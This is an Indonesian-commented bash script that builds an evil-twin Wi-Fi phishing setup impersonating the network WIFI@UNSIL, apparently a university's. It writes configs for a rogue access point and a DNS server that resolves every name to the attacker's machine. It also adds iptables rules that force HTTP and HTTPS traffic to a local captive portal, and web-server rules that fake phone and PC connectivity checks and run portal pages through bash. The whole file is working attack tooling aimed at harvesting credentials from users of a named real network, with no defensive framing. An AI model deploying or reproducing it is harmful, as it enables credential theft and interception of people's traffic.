#=============================================#
# SCRIPT SH FISHING WIFI@UNSIL DENGAN EVILTWIN # 
#=============================================#
#-------------- BY WONGGANTENG ---------------#
#----------- ©️ 2025 Wonggantengg ------------#
#------------- Script versi 0.4.2 ------------#
#=============================================#
#!/bin/bash
echo "🌟🌟🌟🌟🌟"


# =======================================
# Perintah Install Paket Yang Di Perlukan
# =======================================

# ==============================
# Daftar paket wajib
# ==============================
PACKAGES=(
    # xterm
    hostapd
    isc-dhcp-server
    dnsmasq
    lighttpd
    iptables
    dos2unix
    wireless-tools
    iw
    net-tools
    aircrack-ng
    procps
    zip
    unzip
)

echo "Memeriksa paket..."
MISSING=()

# ==============================
# Cek satu per satu paket
# ==============================
for pkg in "${PACKAGES[@]}"; do
    if dpkg -s "$pkg" >/dev/null 2>&1; then
        echo "✅ [OK]   $pkg sudah terinstal."
    else
        echo "❌ [MISS] $pkg belum terinstal."
        MISSING+=("$pkg")
    fi
done

# ==============================
# Jika tidak ada paket yang hilang
# ==============================
if [ ${#MISSING[@]} -eq 0 ]; then
    echo "✅ Semua paket sudah terinstal."
else
    echo ""
    while true; do
        read -rp "Lanjut instalasi? (y/N): " confirm

        if [[ "$confirm" =~ ^[Yy]$ ]]; then
            echo "Melanjutkan instalasi..."
            sudo apt update
            sudo apt install -y "${MISSING[@]}"
            echo "✅ Instalasi selesai."
            break

        elif [[ "$confirm" =~ ^[Nn]$ ]]; then
            echo "❌ Instalasi dibatalkan oleh pengguna."
            exit 0

        else
            echo "Input tidak valid! Harus (y) atau (n)."
        fi
    done
fi

# =======================================
# Akhir Perintah Install Paket Yang Di Perlukan
# =======================================

echo ""
# ===================================
# Pastikan folder /wifi ada
# ===================================
# echo "📁 Memastikan semua folder ada..."
sudo mkdir -p \
    /tmp/wifi-WIFI@UNSIL \
    /tmp/wifi-WIFI@UNSIL/www \
    /tmp/wifi-WIFI@UNSIL/conf \
    /tmp/wifi-WIFI@UNSIL/conf/backup-conf \
    /tmp/wifi-WIFI@UNSIL/log \
    /tmp/wifi-WIFI@UNSIL/sh \
    /tmp/wifi-WIFI@UNSIL/portal \
    || { echo "❌ Gagal membuat folder!"; exit 1; }

echo "✅ 📁 Membuat folder : /tmp/wifi-WIFI@UNSIL dan subfolder..."

# ===================================
# Buat wifi-hostapd.conf
# ===================================
sudo tee /tmp/wifi-WIFI@UNSIL/conf/wifi-hostapd.conf > /dev/null <<EOL
interface=wlan0
driver=nl80211
ssid=WIFI@UNSIL
#bssid=5A:E9:F1:A0:BB:8E
channel=4
hw_mode=g
EOL
if [ $? -eq 0 ]; then
    echo "✅ File : /tmp/wifi-WIFI@UNSIL/conf/wifi-hostapd.conf berhasil dibuat."
else
    echo "❌ ERROR: File /tmp/wifi-WIFI@UNSIL/conf/wifi-hostapd.conf gagal dibuat..."
    # Opsional: Tampilkan pesan error lebih detail jika Anda punya logging khusus
fi


# ===================================
# Buat wifi-dnsmasq.conf
# ===================================
sudo tee /tmp/wifi-WIFI@UNSIL/conf/wifi-dnsmasq.conf > /dev/null <<EOL
interface=wlan0
address=/#/192.169.1.1
port=53
bind-dynamic
except-interface=lo
address=/google.com/172.217.5.238
address=/gstatic.com/172.217.5.238
no-dhcp-interface=wlan0
log-queries
no-daemon
no-resolv
no-hosts
EOL

if [ $? -eq 0 ]; then
    echo "✅ File : /tmp/wifi-WIFI@UNSIL/conf/wifi-dnsmasq.conf berhasil dibuat."
else
    echo "❌ ERROR: File /tmp/wifi-WIFI@UNSIL/conf/wifi-dnsmasq.conf gagal dibuat..."
    # Opsional: Tampilkan pesan error lebih detail jika Anda punya logging khusus
fi

# ===================================
# Buat wifi-dhcpd.conf
# ===================================
sudo tee /tmp/wifi-WIFI@UNSIL/conf/wifi-dhcpd.conf > /dev/null <<EOL
authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 192.169.1.0 netmask 255.255.255.0 {
    option broadcast-address 192.169.1.255;
    option routers 192.169.1.1;
    option subnet-mask 255.255.255.0;
    option domain-name-servers 192.169.1.1;
    range 192.169.1.33 192.169.1.100;
}
lease-file-name "/var/lib/dhcp/dhcpd.leases";
EOL

if [ $? -eq 0 ]; then
    echo "✅ File : /tmp/wifi-WIFI@UNSIL/conf/wifi-dhcpd.conf berhasil dibuat."
else
    echo "❌ ERROR: File /tmp/wifi-WIFI@UNSIL/conf/wifi-dhcpd.conf gagal dibuat..."
    # Opsional: Tampilkan pesan error lebih detail jika Anda punya logging khusus
fi


# ===================================
# Buat wifi-lighttpd.conf
# ===================================
sudo tee /tmp/wifi-WIFI@UNSIL/conf/wifi-lighttpd.conf > /dev/null <<EOL
server.document-root = "/tmp/wifi-WIFI@UNSIL/www/"

server.modules = (
    "mod_auth",
    "mod_cgi",
    "mod_redirect",
    "mod_accesslog"
)

\$HTTP["host"] =~ "login.portal.com" {
    url.rewrite-if-not-file = ( ".*" => "/index.htm" )
}

\$HTTP["host"] =~ "(.*)" {
    url.redirect = ( "^/index.htm$" => "/")
    url.redirect-code = 302
}
\$HTTP["host"] =~ "gstatic.com" {
    url.redirect = ( "^/(.*)$" => "http://connectivitycheck.google.com/")
    url.redirect-code = 302
}
\$HTTP["host"] =~ "captive.apple.com" {
    url.redirect = ( "^/(.*)$" => "http://connectivitycheck.apple.com/")
    url.redirect-code = 302
}
\$HTTP["host"] =~ "msftconnecttest.com" {
    url.redirect = ( "^/(.*)$" => "http://connectivitycheck.microsoft.com/")
    url.redirect-code = 302
}
\$HTTP["host"] =~ "msftncsi.com" {
    url.redirect = ( "^/(.*)$" => "http://connectivitycheck.microsoft.com/")
    url.redirect-code = 302
}

server.bind = "192.169.1.1"
server.port = 80
index-file.names = ("index.htm")
server.error-handler-404 = "/"

mimetype.assign = (
    ".htm" => "text/htm",
    ".html" => "text/html",
    ".css" => "text/css",
    ".js" => "text/javascript"
)

cgi.assign = (".htm" => "/bin/bash")

accesslog.filename = "/tmp/wifi-WIFI@UNSIL/log/lighttpd.log"
accesslog.escaping = "default"
accesslog.format = "%h %s %r %v%U %t '%{User-Agent}i'"
\$HTTP["remote-ip"] == "127.0.0.1" { accesslog.filename = "" }
EOL

if [ $? -eq 0 ]; then
    echo "✅ File : /tmp/wifi-WIFI@UNSIL/conf/wifi-lighttpd.conf berhasil dibuat."
else
    echo "❌ ERROR: File /tmp/wifi-WIFI@UNSIL/conf/wifi-lighttpd.conf gagal dibuat..."
    # Opsional: Tampilkan pesan error lebih detail jika Anda punya logging khusus
fi

# ===================================
# Buat wifi-start.sh
# ===================================
sudo tee /tmp/wifi-WIFI@UNSIL/sh/wifi-start.sh > /dev/null <<'EOL'
#!/bin/bash
sudo airmon-ng check kill
sudo ifconfig wlan0 down
sudo ifconfig wlan0 192.169.1.1 netmask 255.255.255.0 up
sudo sysctl -w net.ipv4.ip_forward=1

sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -t nat -X

sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 80
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 80

sudo iptables -A INPUT -i wlan0 -p udp --dport 53 -j ACCEPT
sudo iptables -A INPUT -i wlan0 -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -i wlan0 -p tcp --dport 443 -j ACCEPT
EOL
sudo chmod +x /tmp/wifi-WIFI@UNSIL/sh/wifi-start.sh

if [ $? -eq 0 ]; then
    echo "✅ File : /tmp/wifi-WIFI@UNSIL/sh/wifi-start.sh berhasil dibuat."
else
    echo "❌ ERROR: /tmp/wifi-WIFI@UNSIL/sh/wifi-start.sh gagal dibuat..."
    # Opsional: Tampilkan pesan error lebih detail jika Anda punya logging khusus
fi

# ===================================
# Buat wifi-stop.sh
# ===================================
sudo tee /tmp/wifi-WIFI@UNSIL/sh/wifi-stop.sh > /dev/null <<'EOL'
#!/bin/bash
sudo pkill lighttpd
sudo pkill dnsmasq
sudo pkill hostapd
sudo pkill dhcpd

sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -t nat -X

sudo ifconfig wlan0 down
sudo sysctl -w net.ipv4.ip_forward=0
sudo systemctl restart NetworkManager
EOL
sudo chmod +x /tmp/wifi-WIFI@UNSIL/sh/wifi-stop.sh

if [ $? -eq 0 ]; then
    echo "✅ File : /tmp/wifi-WIFI@UNSIL/sh/wifi-stop.sh berhasil dibuat."
else
    echo "❌ ERROR: /tmp/wifi-WIFI@UNSIL/sh/wifi-stop.sh gagal dibuat..."
    # Opsional: Tampilkan pesan error lebih detail jika Anda punya logging khusus
fi


# ===================================
# Buat ubuntu-wifi_WIFI@UNSIL.sh
# ===================================
sudo tee /tmp/wifi-WIFI@UNSIL/ubuntu-wifi_WIFI@UNSIL.sh > /dev/null <<'EOL'
#!/bin/bash

START_SCRIPT="/tmp/wifi-WIFI@UNSIL/sh/wifi-start.sh"
STOP_SCRIPT="/tmp/wifi-WIFI@UNSIL/sh/wifi-stop.sh"
SERVICE_PIDS=()


# =======================================
# Perintah Install Paket Yang Di Perlukan
# =======================================

# ==============================
# Daftar paket wajib
# ==============================
PACKAGES=(
    # xterm
    hostapd
    isc-dhcp-server
    dnsmasq
    lighttpd
    iptables
    dos2unix
    wireless-tools
    iw
    net-tools
    aircrack-ng
    procps
    zip
    unzip
)

echo "Memeriksa paket..."
MISSING=()

# ==============================
# Cek satu per satu paket
# ==============================
for pkg in "${PACKAGES[@]}"; do
    if dpkg -s "$pkg" >/dev/null 2>&1; then
        echo "✅ [OK]   $pkg sudah terinstal."
    else
        echo "❌ [MISS] $pkg belum terinstal."
        MISSING+=("$pkg")
    fi
done

# ==============================
# Jika tidak ada paket yang hilang
# ==============================
if [ ${#MISSING[@]} -eq 0 ]; then
    echo "✅ Semua paket sudah terinstal."
else
    echo ""
    while true; do
        read -rp "Lanjut instalasi? (y/N): " confirm

        if [[ "$confirm" =~ ^[Yy]$ ]]; then
            echo "Melanjutkan instalasi..."
            sudo apt update
            sudo apt install -y "${MISSING[@]}"
            echo "✅ Instalasi selesai."
            break

        elif [[ "$confirm" =~ ^[Nn]$ ]]; then
            echo "❌ Instalasi dibatalkan oleh pengguna."
            exit 0

        else
            echo "Input tidak valid! Harus (y) atau (n)."
        fi
    done
fi

# =======================================
# Akhir Perintah Install Paket Yang Di Perlukan
# =======================================

# echo ""
# ==============================
# Pastikan wlan0 ada
# ==============================
if ! ip link show wlan0 >/dev/null 2>&1; then
    echo "Interface wlan0 tidak ditemukan!"
    echo "⌨️ Edit di sini dan cari wlan0 ganti dengan nama interface anda gunakan!..."
    echo "⌨️ sudo nano "/tmp/wifi-WIFI@UNSIL/ubuntu-wifi_WIFI@UNSIL.sh""
    echo "⌨️ sudo nano "/tmp/wifi-WIFI@UNSIL/conf/wifi-hostapd.conf""
    echo "⌨️ sudo nano "/tmp/wifi-WIFI@UNSIL/conf/wifi-dnsmasq.conf""
    echo "⌨️ sudo nano "/tmp/wifi-WIFI@UNSIL/sh/wifi-start.sh""
    echo "⌨️ sudo nano "/tmp/wifi-WIFI@UNSIL/sh/wifi-stop.sh""
    exit 1
fi


# ==============================
# --- FUNGSI BARU DITAMBAHKAN DI SINI ---
# Fungsi untuk memastikan file leases DHCP ada
# ==============================
ensure_dhcp_lease_file() {
    local lease_file="/var/lib/dhcp/dhcpd.leases"
    
    # Memeriksa apakah file sudah ada
    if [[ -f "$lease_file" ]]; then
        echo "File $lease_file sudah ada, dilewati."
    else
        echo "File $lease_file tidak ditemukan, membuat file baru."
        # Membuat direktori jika belum ada
        sudo mkdir -p $(dirname "$lease_file")
        # Membuat file kosong
        sudo touch "$lease_file"
    fi
    # Mengatur kepemilikan (umumnya dhcpd di Kali/Debian)
    sudo chown root:root "$lease_file"
    echo "File $lease_file berhasil dibuat dan izin diatur."
}
# ----------------------------------------


kill_children() {
    local parent=$1
    for child in $(pgrep -P $parent 2>/dev/null || true); do
        kill_children $child
        kill -9 $child 2>/dev/null
    done
}

cleanup() {
    echo "Stopping all services..."
    for pid in "${SERVICE_PIDS[@]}"; do
        if kill -0 "$pid" 2>/dev/null; then
            kill_children $pid
            kill -9 $pid 2>/dev/null
        fi
    done
    [[ -f "$STOP_SCRIPT" ]] && bash "$STOP_SCRIPT"
    exit 0
}

trap cleanup SIGINT SIGTERM

[[ -f "$START_SCRIPT" ]] && bash "$START_SCRIPT"

ensure_dhcp_lease_file

# ========================================
# Perintah untuk menjalankan file konfigurasi
# ========================================
sudo hostapd "/tmp/wifi-WIFI@UNSIL/conf/wifi-hostapd.conf" &
sudo dhcpd -d -cf "/tmp/wifi-WIFI@UNSIL/conf/wifi-dhcpd.conf" wlan0 &
sudo dnsmasq -C "/tmp/wifi-WIFI@UNSIL/conf/wifi-dnsmasq.conf" &
sudo lighttpd -D -f "/tmp/wifi-WIFI@UNSIL/conf/wifi-lighttpd.conf" &

echo "Press Ctrl+C to stop all services..."
while true; do sleep 1; done
EOL
sudo chmod +x /tmp/wifi-WIFI@UNSIL/ubuntu-wifi_WIFI@UNSIL.sh

if [ $? -eq 0 ]; then
    echo "✅ File : /tmp/wifi-WIFI@UNSIL/ubuntu-wifi_WIFI@UNSIL.sh berhasil dibuat."
else
    echo "❌ ERROR: /tmp/wifi-WIFI@UNSIL/ubuntu-wifi_WIFI@UNSIL.sh gagal dibuat..."
    # Opsional: Tampilkan pesan error lebih detail jika Anda punya logging khusus
fi
#echo ""

# ========================================
# Perintah untuk menyalin file konfigurasi
# ========================================
sudo cp -f /tmp/wifi-WIFI@UNSIL/conf/*.conf /tmp/wifi-WIFI@UNSIL/conf/backup-conf/
sudo cp -f /tmp/wifi-WIFI@UNSIL/conf/backup-conf/wifi-dhcpd.conf /etc/dhcp/wifi-dhcpd.conf
sudo ln -sf /etc/dhcp/wifi-dhcpd.conf /tmp/wifi-WIFI@UNSIL/conf/wifi-dhcpd.conf

if [ $? -eq 0 ]; then
    echo "✅ Salinan file konfigurasi berhasil!"
else
    echo "❌ ERROR: Salinan file konfigurasi gagal."
    # Opsional: Tampilkan pesan error lebih detail jika Anda punya logging khusus
fi

# ========================================
# Perintah untuk menyalin file /tmp/wifi-WIFI@UNSIL/www/
# ========================================
sudo cp -rf ./www/* /tmp/wifi-WIFI@UNSIL/www/
# Cek exit status dari perintah 'sudo cp' yang baru saja dijalankan
if [ $? -eq 0 ]; then
    echo "✅ Salinan file /tmp/wifi-WIFI@UNSIL/www/ berhasil!"
else
    echo "❌ ERROR: Salinan file /tmp/wifi-WIFI@UNSIL/www/ gagal."
    # Opsional: Tampilkan pesan error lebih detail jika Anda punya logging khusus
fi

# ========================================
# Perintah untuk menyalin merubah kepemilikan
# ========================================
sudo chown -R $USER:$USER /tmp/wifi-WIFI@UNSIL
echo "✅ File /tmp/wifi-WIFI@UNSIL berhasil diubah kepemilikan nya."
echo "✅ Menjadi $USER:$USER"
echo ""

# ========================================
# Perintah dos2unix
# ========================================
find /tmp/wifi-WIFI@UNSIL -type f \( -name "*.sh" -o -name "*.conf" -o -name "*.html*" -o -name "*.htm*" -o -name "*.css*" -o -name "*.js*" \) -exec sudo dos2unix {} \;

echo ""
# ========================================
# FINISHING
# ========================================
echo "🌟🌟🌟🌟🌟"
#echo ""
echo "🚀 Cara Menjalankan nya..."
echo "💻 sudo bash /tmp/wifi-WIFI@UNSIL/ubuntu-wifi_WIFI@UNSIL.sh"
echo ""
echo "💻 + ⌨️ Selamat Beraktivitas... Semoga lancar!..."
echo "🌟🌟🌟🌟🌟"
